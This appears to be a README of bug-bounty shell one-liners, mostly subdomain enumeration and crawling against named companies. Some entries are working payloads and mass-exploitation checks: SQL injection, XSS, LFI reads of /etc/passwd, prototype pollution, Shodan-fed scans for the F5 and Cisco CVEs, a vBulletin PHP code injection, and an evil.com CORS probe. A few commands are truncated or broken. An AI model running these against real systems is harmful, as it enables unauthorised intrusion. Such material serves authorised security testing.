## Special thanks

- [@Stokfredrik](https://twitter.com/stokfredrik)
- [@Jhaddix](https://twitter.com/Jhaddix)
- [@pdiscoveryio](https://twitter.com/pdiscoveryio)
- [@TomNomNom](https://twitter.com/TomNomNom)
- [@NahamSec](https://twitter.com/NahamSec)



## Scripts that need to be installed

To run the project, you will need to install the following programs:

- [Anew](https://github.com/tomnomnom/anew)
- [Qsreplace](https://github.com/tomnomnom/qsreplace)
- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Gospider](https://github.com/jaeles-project/gospider)
- [Github-Search](https://github.com/gwen001/github-search)
- [Amass](https://github.com/OWASP/Amass)
- [Hakrawler](https://github.com/hakluke/hakrawler)
- [Gargs](https://github.com/brentp/gargs)


###  Search Asn Amass

- [Explaining command](https://bit.ly/2EMooDB)

Amass intel will search the organization "PayPal" from a database of ASNs at a faster-than-default rate. It will then take these ASN numbers and scan the complete ASN/IP space for all TLD's in that IP space (paypal.com, paypal.co.id, paypal.me).

```bash
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''
```

###  Using chaos search js

- [Explaining command](https://bit.ly/32vfRg7)

Choas is an API by Project Discovery that discovers subdomains. Here we are querying thier API for all known subdoains of "att.com". We are then using httpx to find which of those domains is live and hosts an HTTP or HTTPs site. We then pass those URLs to GoSpider to visit them and crawl them for all links (javascript, endpoints, etc). We then grep to find all the JS files. We pipe this all through anew so we see the output iterativlely (faster) and grep for "(http|https)://att.com" to make sure we dont recieve output for domains that are not "att.com".

```bash
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s#]
```

### Search Subdomain using Gospider

- [Explaining command](https://bit.ly/2QtG9do)

```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

### Using gospider to chaos

- [Explaining command](https://bit.ly/2D4vW3W)

```bash
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'
```

### Using recon.dev and gospider crawler subdomains

- [Explaining command](https://bit.ly/32pPRDa)

```bash
curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew'
```

### PSQL - search subdomain using cert.sh

- [Explaining command](https://bit.ly/32rMA6e)

```bash
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew'
```

### Search subdomains using Github and httpx

- [Github-search](https://github.com/gwen001/github-search) - Using python3 to search subdomains, httpx filter hosts by up status-code response (200)

```python
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
```

### Search SQLINJECTION using qsreplace search syntax error

- [Explained comand](https://bit.ly/3hxFWS2)

```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

### Search subdomains using jldc

- [Explained comand](https://bit.ly/2YBlEjm)

```bash
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```

### Search subdomains in assetfinder using hakrawler spider to search links in content responses

- [Explained comand](https://bit.ly/3hxRvZw)

```bash
assetfinder -subs-only http://tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
```

### Search subdomains in cert.sh

- [Explained comand](https://bit.ly/2QrvMXl)

```bash
curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
```

### Search subdomains in cert.sh assetfinder to search in link /.git/HEAD

- [Explained comand](https://bit.ly/3lhFcTH)

```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```bash
curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
### Collect js files from hosts up by gospider

- [Explained comand](https://bit.ly/3aWIwyI)

```bash
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```

### Subdomain search Bufferover resolving domain to httpx

- [Explained comand](https://bit.ly/3lno9j0)

```bash
curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
```

### Using gargs to gospider search with parallel proccess
- [Gargs](https://github.com/brentp/gargs)

- [Explained comand](https://bit.ly/2EHj1FD)

```bash
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
```

### Injection xss using qsreplace to urls filter to gospider

- [Explained comand](https://bit.ly/3joryw9)

```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

### Extract URL's to apk

- [Explained comand](https://bit.ly/2QzXwJr)

```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
```

### Chaos to Gospider

- [Explained comand](https://bit.ly/3gFJbpB)

```bash
chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
```

### Checking invalid certificate

- [Real script](https://bit.ly/2DhAwMo)
- [Script King](https://bit.ly/34Z0kIH)

```bash
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
```

### Using shodan & Nuclei

- [Explained comand](https://bit.ly/3jslKle)

```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

### Open Redirect test using gf.

- [Explained comand](https://bit.ly/3hL263x)

```bash
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```

### Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".

- [Explained comand](https://bit.ly/2QQfY0l)

```bash
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
```
### Using Chaos to jaeles "How did I find a critical today?.

- [Explained comand](https://bit.ly/2YXiK8N)

```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```

### Using shodan to jaeles
- [Explained comand](https://bit.ly/2Dkmycu)

```bash
domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
```

### Search to files using assetfinder and ffuf

- [Explained comand](https://bit.ly/2Go3Ba4)

```bash
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
```
### Local File Inclusion
> @dwisiswant0

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open-redirect
> @dwisiswant0

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

> @N3T_hunt3r
```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

### XSS
> @cihanmehmet

```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
```

> @fanimalikhack

```bash
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
```

> @oliverrickfors

```bash
cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```

### Prototype Pollution
> @R0X4R

```bash
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

### CVE-2020-5902
> @Madrobot_

```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```

### CVE-2020-3452
> @vict0ni

```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
```

### CVE-2022-0378
> @7h3h4ckv157

```bash
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```

### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
> @Madrobot_

```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```

### Find JavaScript Files
> @D0cK3rG33k

```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```

### Extract Endpoints from JavaScript
> @renniepak

```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

### Get CIDR & Org Information from Target Lists
> @steve_mcilwain

```bash
for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```

### Get Subdomains from RapidDNS.io
> @andirrahmani1

```bash
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u
```

### Get Subdomains from BufferOver.run
> @\_ayoubfathi\_

```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```

> @AnubhavSingh_
```bash
export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"
```

### Get Subdomains from Riddler.io
> @pikpikcu

```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### Get Subdomains from VirusTotal
> @pikpikcu

```bash
curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomain with cyberxplore
> @pikpikcu

```
curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" 
```

### Get Subdomains from CertSpotter
> @caryhooper

```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### Get Subdomains from Archive
> @pikpikcu

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

### Get Subdomains from JLDC
> @pikpikcu

```bash
curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomains from securitytrails
> @pikpikcu

```bash
curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u
```

### Bruteforcing Subdomain using DNS Over 
> @pikpikcu

```
while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt
```

### Get Subdomains With sonar.omnisint.io
> @pikpikcu

```
curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

### Get Subdomains With synapsint.com
> @pikpikcu

```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

### Get Subdomains from crt.sh
> @vict0ni

```bash
curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

### Sort & Tested Domains from Recon.dev
> @stokfedrik

```bash
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent
```

### Subdomain Bruteforcer with FFUF
> @GochaOqradze

```bash
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
```

### Find Allocated IP Ranges for ASN from IP Address
> wains.be

```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```

### Extract IPs from a File
> @emenalf

```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

### Ports Scan without CloudFlare
> @dwisiswant0

```bash
subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```

### Create Custom Wordlists
> @tomnomnom

```bash
gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt
```

```bash
cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  
```

### Extracts Juicy Informations
> @Prial Islam Khan

```bash
for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done
```

### Find Subdomains TakeOver
> @hahwul

```bash
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

### Dump Custom URLs from ParamSpider
> @hahwul

```bash
cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
```

### URLs Probing with cURL + Parallel
> @akita_zen

```bash
cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

### Dump In-scope Assets from `chaos-bugbounty-list`
> @dwisiswant0

```bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
```

### Dump In-scope Assets from `bounty-targets-data`
> @dwisiswant0

#### HackerOne Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

#### BugCrowd Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### Intigriti Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```

#### YesWeHack Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### HackenProof Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```

#### Federacy Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

### Dump URLs from sitemap.xml
> @healthyoutlet

```bash
curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
```

### Pure Bash Linkfinder
> @ntrzz

```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt
```

### Extract Endpoints from swagger.json
> @zer0pwn

```bash
curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
```

### CORS Misconfiguration
> @manas_hunter

```bash
site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
```

### Find Hidden Servers and/or Admin Panels
> @rez0__

```bash
ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
```

### Recon Using api.recon.dev
> @z0idsec

```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain
```

### Find Live Host/Domain/Assets
> @_YashGoti_

```bash
subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

### XSS without gf
> @HacktifyS

```bash
waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
```

### Get Subdomains from IPs
> @laughface809

```bash
python3 hosthunter.py HOSTS.txt > OUT.txt
```

### Gather Domains from Content-Security-Policy
> @geeknik

```bash
curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```

### Nmap IP:PORT Parser Piped to HTTPX
> @dwisiswant0

```bash
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
```
More Credits: harshinsecurity
